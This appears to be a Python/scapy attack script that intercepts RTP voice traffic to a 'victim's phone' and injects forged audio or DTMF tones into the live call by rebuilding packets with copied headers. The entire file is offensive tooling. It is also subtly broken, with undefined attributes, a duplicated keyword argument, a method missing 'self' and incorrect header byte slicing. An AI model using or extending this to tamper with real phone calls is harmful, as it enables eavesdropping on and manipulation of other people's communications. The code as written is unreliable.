from scapy.all import *
from scapy.layers.inet import *
from scapy.packet import Raw
import logging
import audioop
import io
import threading 
import wave 
import time

class conversation:
    def __init__(self, parsed: Dict[str,str]):
        # SRC should be PBX
        self.src_IP = parsed["From_ip"]
        self.src_ext = parsed["From_ext"]
        # DST should be victim's phone
        self.dst_IP = parsed["To_ip"]
        self.dst_ext = parsed["To_ext"]
        self.enforce = False
        self.buffer = io.BytesIO()
        self.bufferLock = threading.Lock()
        self.starttime=9999999999.0


    def get_enforce(self, pkt: Packet):
        '''Checks if conversation should be manipulated
        Returns: 0-packet does not correspond to this conversation
        1- packet corresponds and conversation is not enforcing
        2- packet corresponds and should be enforced'''
        # auto enforce after 1.5 seconds
        if time.time() - self.starttime > 1.5:
            self.enforce = True
        try:
            ip1 = pkt["IP"].src
            ip2 = pkt["IP"].dst
        except IndexError:
            logging.warning("Analysis: got bad packet!")
            return 0
        if (self.src == ip1 and self.dst == ip2) or (self.src == ip2 and self.dst == ip1):
            if self.enforce:
                return 2
            return 1
        return 0
        
                
    def parse_rtp(self, content: scapy.layers.rtp.RTP):
        self.framecount += 1
        # Convert RTP payload to linear sound
        # re-implimentation of pyvoip's RTP library
        # Convert to linear audio
        data = audioop.ulaw2lin(content.payload, 1)
        data = audioop.bias(data, 1, 128)
        # write to audio buffer
        self.bufferLock.acquire()
        self.buffer.write(data)
        #reset the buffer to where the playhead last was
        self.bufferLock.release()

class girlboss:
    def __init__(self, path: str):
        f = wave.open(path, 'rb')
        frames = f.getnframes()
        data = f.readframes(frames)
        f.close()
        self.txbuff = io.BytesIO()
        self.txbuff.write(data)
        self.buffbak = self.txbuff
    
    def manipulate(self, pkt: Packet):
        pkt = pkt["IP"]
        content = self.txbuff.read(160)
        #try to read 1 packet worth of data
        #if we don't have enough for a full packet, just let the OG packet through
        if len(content) < 160:
            logging.info("Done with DTMF transmission")
            return pkt
        # Encode payload for PCMU transmission
        content = audioop.bias(content, 1, -128)
        content = audioop.lin2ulaw(content, 1)
        # strip headers from og packet
        header = self.parse_header(pkt.lastlayer().load[0:11])
        # add old header to new data
        content = Raw(header + content)
        #Build new packet to force checksum recalculation
        newpkt = IP(src=pkt.src,dst=pkt.dst)/UDP(sport=pkt.payload.sport,sport=pkt.payload.dport)/content
        send(newpkt)

    def parse_header(hdr: bytes) -> bytes:
        garb = hdr[0:1] # data we don't care about
        seq = int.from_bytes(hdr[2:3], byteorder="big") + 1
        ts = int.from_bytes(hdr[4:7], byteorder="big") + 1000
        ssrc = hdr[8:]
        seq = seq.to_bytes(2,"big")
        ts = ts.to_bytes(2,"big")
        return garb + seq + ts + ssrc


    def reset(self):
        self.txbuff = self.buffbak

class convostore:
    def __init__(self):
        self.conversations = []
        self.lock = threading.Lock()